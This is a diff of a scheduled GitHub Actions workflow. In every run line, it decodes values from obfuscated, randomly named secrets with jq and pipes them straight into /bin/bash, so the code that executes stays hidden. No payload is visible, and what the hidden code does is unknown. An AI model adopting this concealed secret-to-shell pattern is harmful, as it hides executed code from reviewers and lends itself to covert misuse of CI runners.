@@ -2,22 +2,30 @@ name: jiugongchang3
 on:
   workflow_dispatch:
   schedule:
-    - cron: '24 1/6 * * *'
+    - cron: '40 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jiugongchang3
         env:
-          xvc89: ${{ secrets.xvc89 }}
+          qq9: ${{ secrets.qq9 }}
         run: |
-          echo $xvc89 | jq -r .cxia8449 | /bin/bash
-          echo $tno6 | jq -r .cev36011 | /bin/bash
-          echo $oa6208 | jq -r .kqznv7414 | /bin/bash
-          echo $k139 | jq -r .xbz99511 | /bin/bash
-          echo $zq77 | jq -r .bc885 | /bin/bash
-          echo $j13018 | jq -r .sa147 | /bin/bash
-          echo $hjx64637 | jq -r .aw1212 | /bin/bash
-          echo $hwyi5 | jq -r .e261 | /bin/bash
+          echo $qq9 | jq -r .rmq00 | /bin/bash
+          echo $qly4 | jq -r .y489 | /bin/bash
+          echo $s350 | jq -r .yix00 | /bin/bash
+          echo $wt0484 | jq -r .pswbb93079 | /bin/bash
+          echo $uiwk12174 | jq -r .drhkv2 | /bin/bash
+          echo $tn98 | jq -r .wbdkr5252 | /bin/bash
+          echo $y6504 | jq -r .s0840 | /bin/bash
+          echo $d171 | jq -r .kha0576 | /bin/bash
+          echo $extw7697 | jq -r .zwnj3 | /bin/bash
+          echo $oayzu55 | jq -r .m437 | /bin/bash
+          echo $n3649 | jq -r .ii0250 | /bin/bash
+          echo $kgkh6147 | jq -r .i9 | /bin/bash
+          echo $grs23 | jq -r .c22949 | /bin/bash
+          echo $jil4 | jq -r .ehc435 | /bin/bash
 
